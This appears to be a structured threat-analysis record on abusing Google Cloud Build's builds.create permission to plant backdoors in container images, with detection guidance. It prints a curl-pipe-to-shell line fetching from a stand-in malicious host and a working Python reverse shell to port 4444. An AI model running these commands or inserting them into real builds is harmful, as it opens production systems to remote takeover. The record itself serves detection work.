package_info.package_name: Google Cloud Build (abused via cloudbuild.builds.create permission)
package_info.why_malicious: The abuse of the cloudbuild.builds.create permission allows attackers to escalate privileges, inject malicious code into production container images, and poison the software supply chain, leading to backdoors, data theft, and denial-of-service attacks.

execution_context.file_location: Injected into container images via Google Cloud Build pipeline

malicious_snippets.code_snippet:
// Example: Malicious shell command injected into Dockerfile or build script
RUN curl -fsSL http://malicious.example.com/backdoor.sh | sh
malicious_snippets.code_behavior: During build-time, the code downloads and executes a remote shell script from a malicious domain, which installs a backdoor into the container image, enabling remote access when the image is deployed.

malice_analysis.why_suspicious: The build process is used to inject code from an untrusted external source, which is not part of the legitimate application.
malice_analysis.violated_expectations: Normal builds should only include code from trusted repositories and not fetch or execute remote scripts from unknown domains.
malice_analysis.similar_legitimate_use: Fetching dependencies from official package repositories during build (e.g., apt-get, pip install) is legitimate, but fetching and executing arbitrary scripts is not.
key_indicators: curl/wget to external domain in build scripts
piping remote script output directly to shell
modification of container images outside of source control

execution_context.trigger: Runtime (when compromised image is launched in GKE)
execution_context.file_location: Entrypoint or startup script inside compromised container image

malicious_snippets.code_snippet:
# Example: Python backdoor in entrypoint
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("malicious.example.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
malicious_snippets.code_behavior: At runtime, the code opens a reverse shell connection to a remote attacker-controlled server, granting remote command execution inside the production environment.

malice_analysis.why_suspicious: The code establishes an outbound connection to an untrusted server and provides shell access, which is a classic backdoor technique.
malice_analysis.violated_expectations: Application containers should not initiate arbitrary outbound connections or provide shell access to external parties.
malice_analysis.similar_legitimate_use: Remote debugging tools may open connections, but only to trusted endpoints and with authentication.
key_indicators: use of socket to connect to remote host
duplication of file descriptors for shell access

attack_chain.action: Attacker abuses cloudbuild.builds.create permission to initiate a new build as a privileged service account.
attack_chain.leads_to: Ability to modify build artifacts and inject malicious code

attack_chain.action: Malicious code is injected into container images during the build process (e.g., via Dockerfile or build script).
attack_chain.leads_to: Compromised images are stored in Artifact Registry

attack_chain.action: Compromised images are deployed to Google Kubernetes Engine (GKE) or other production environments.
attack_chain.leads_to: Malicious code is executed in production

attack_chain.action: Backdoor code executes at runtime, establishing a remote connection for attacker control.
attack_chain.leads_to: Attacker gains persistent access, enabling data theft, DoS, or further lateral movement

behavioral_signatures: Unexpected build jobs initiated by non-standard accounts
Build scripts downloading and executing remote code
Container images with outbound connections to untrusted domains
Reverse shell or backdoor patterns in entrypoint scripts
file_indicators: Dockerfile or build scripts containing curl/wget to external domains
Entrypoint scripts with socket or subprocess usage
Unusual modifications to images in Artifact Registry
network_indicators: Outbound connections from build or runtime environments to unknown IPs/domains
Connections to attacker-controlled C2 infrastructure (e.g., malicious.example.com:4444)
detection_knowledge.how_to_detect: Monitor Cloud Build logs for unexpected build initiations and privilege escalations. Scan build scripts and Dockerfiles for commands that fetch and execute remote code. Analyze container images for embedded backdoor code and monitor runtime network activity for suspicious outbound connections. Enforce least privilege on cloudbuild.builds.create and related permissions.
